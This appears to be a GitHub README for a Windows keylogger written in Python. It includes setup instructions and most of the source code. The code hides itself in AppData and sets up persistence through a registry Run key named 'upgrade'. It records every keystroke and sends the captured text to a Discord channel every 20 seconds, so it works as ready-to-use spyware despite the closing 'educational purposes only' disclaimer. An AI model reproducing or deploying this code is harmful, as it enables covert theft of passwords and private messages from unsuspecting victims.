# Keylogger with Discord Integration

This project is a keylogger that captures keystrokes and sends them to a Discord channel using a bot. The keylogger is designed to run on Windows and can be added to the system's startup programs.

## Features

- Captures all keystrokes and saves them to a local file.
- Sends the captured keystrokes to a specified Discord channel.
- Adds itself to the Windows startup programs to run automatically.

## Requirements

- Python 3.6 or higher
- `pynput` library for capturing keystrokes
- `discord.py` library for Discord bot integration

## Setup

1. **Clone the repository:**

    ```sh
    git clone https://github.com/yourusername/keylogger-discord.git
    cd keylogger-discord
    ```

2. **Install the required libraries:**

    ```sh
    pip install pynput discord.py
    ```

3. **Configure the Discord bot:**

    - Create a new bot on the [Discord Developer Portal](https://discord.com/developers/applications).
    - Copy the bot token and replace it in the `start_bot` function:

      ```python
      await bot.start("YOUR_BOT_TOKEN")
      ```

    - Get the channel ID where you want to send the messages and replace it in the `send_incoming_message` function:

      ```python
      channel_id = YOUR_CHANNEL_ID
      ```

## How It Works

1. **Adding to Startup:**

    The `add_to_registr` function copies the executable to the AppData directory and adds it to the Windows registry to ensure it runs at startup.

    ```python
    def add_to_registr():
        new_file = os.environ["appdata"] + "\\keylogger.exe"
        new_text = os.environ["appdata"] + "\\keylogger.txt"
        if not os.path.exists(new_file):
            shutil.copyfile(sys.executable, new_file)
            shutil.copyfile(sys.executable, new_text)
            regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
            subprocess.call(regedit_command, shell=True)
    ```

2. **Keylogger Functionality:**

    The `callback_func` function captures keystrokes and writes them to a local file. It stops capturing if the `esc` key is pressed.

    ```python
    def callback_func(key):
        global text, stop_flag

        if key == keyboard.Key.esc:
            stop_flag = True
            return False
        else:
            try:
                if hasattr(key, 'char') and key.char is not None:
                    text += key.char
                elif key == keyboard.Key.space:
                    text += ' '
                elif key == keyboard.Key.enter:
                    text += '\n'
                elif key == keyboard.Key.backspace:
                    text = text[:-1]
            except AttributeError:
                pass

            with open(os.environ["appdata"] + "\\keylogger.txt", "w", encoding="utf-8") as file:
                file.write(text)
    ```

3. **Sending Messages to Discord:**

    The `send_messages` function reads the captured keystrokes from the file and sends them to the specified Discord channel every 20 seconds.

    ```python
    async def send_messages():
        global text, stop_flag
        while not stop_flag:
            with open(os.environ["appdata"] + "\\keylogger.txt", "r", encoding="utf-8") as file:
                icerik = file.read()
            if icerik.strip():
                print(icerik)
                await send_incoming_message(icerik)
                with open(os.environ["appdata"] + "\\keylogger.txt", "w", encoding="utf-8") as file:
                    file.write("")
                text = ""
            await asyncio.sleep(20)
    ```

4. **Starting the Listener and Bot:**

    The `start_listener` function starts a new thread to capture keystrokes, and the `main` function runs the Discord bot and message sending tasks concurrently.

    ```python
    def start_listener():
        with keyboard.Listener(on_press=callback_func) as listener:
            listener.join()

    listener_thread = threading.Thread(target=start_listener)
    listener_thread.start()

    async def main():
        bot_task = asyncio.create_task(start_bot())
        message_task = asyncio.create_task(send_messages())
        await bot_task
        await message_task

    asyncio.run(main())
    ```

## Disclaimer

This project is for educational purposes only. Unauthorized use of this keylogger is illegal and unethical. The author is not responsible for any misuse of this software.


